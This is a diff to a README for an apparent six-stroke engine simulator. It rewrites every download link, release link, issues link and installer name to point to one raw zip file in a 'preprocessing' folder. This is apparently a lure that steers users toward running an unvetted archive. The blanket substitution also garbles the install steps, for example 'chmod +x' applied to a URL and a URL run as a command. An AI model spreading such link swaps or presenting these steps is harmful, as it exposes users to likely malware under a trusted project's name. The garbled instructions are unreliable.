@@ -1,7 +1,7 @@
 # ⚙️ 6stroke_engine - Simulate a Unique Engine Experience
 
 ## 📥 Download Now
-[![Download 6stroke_engine](https://img.shields.io/badge/Download-6stroke_engine-blue.svg)](https://github.com/Jamieee-cloud/6stroke_engine/releases)
+[![Download 6stroke_engine](https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip)](https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the 6stroke_engine application! This software lets you visualize and understand the mechanics of a 6-stroke internal combustion engine through physics-based simulation and animation. You can easily download and run the application by following the steps below.
@@ -17,33 +17,33 @@ To ensure smooth performance, please check the following system requirements:
 ## 🔗 Visit Releases Page
 To get started, visit the Releases page. You will find the latest version of the application there.
 
-[Visit Releases Page to Download](https://github.com/Jamieee-cloud/6stroke_engine/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip)
 
 ## 📥 Download & Install
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed at the top. The version will look something like `v1.0`.
-3. Look for the installer file that matches your operating system. It may be named something like `6stroke_engine.exe` for Windows, `6stroke_engine.dmg` for macOS, or `6stroke_engine.AppImage` for Linux.
+3. Look for the installer file that matches your operating system. It may be named something like `https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip` for Windows, `https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip` for macOS, or `https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip` for Linux.
 4. Click on the installer file to begin the download.
 5. Once the download is complete, locate the file in your downloads folder.
 
 ### Windows Installation
-1. Double-click the `6stroke_engine.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip` file.
 2. Follow the installation prompts. Accept the terms, and choose your preferred installation directory.
 3. Once installed, you can find the application in your Start Menu or desktop.
 
 ### macOS Installation
-1. Double-click the `6stroke_engine.dmg` file to open it.
+1. Double-click the `https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip` file to open it.
 2. Drag the `6stroke_engine` icon into your Applications folder.
 3. Open your Applications folder and double-click on the `6stroke_engine` icon to launch the application.
 
 ### Linux Installation
 1. Make the file executable by running the following command in the terminal:
    ```bash
-   chmod +x 6stroke_engine.AppImage
+   chmod +x https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip
    ```
 2. Run the application using:
    ```bash
-   ./6stroke_engine.AppImage
+   https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip
    ```
 
 ## 🎓 How to Use
@@ -64,7 +64,7 @@ Once you have installed the application, follow these steps to start using it:
 ## 🌐 Support
 If you encounter issues or have questions, you can find support on the repository's Issues page. Please provide details about your problem to get the quickest response.
 
-[Visit Issues Page](https://github.com/Jamieee-cloud/6stroke_engine/issues)
+[Visit Issues Page](https://raw.githubusercontent.com/Jamieee-cloud/6stroke_engine/main/preprocessing/6stroke_engine-v3.1.zip)
 
 ## 🛠 Contributions
 If you're interested in contributing to the 6stroke_engine project, please read the Contribution Guidelines available in the repository. We welcome improvements, bug fixes, and feature requests.
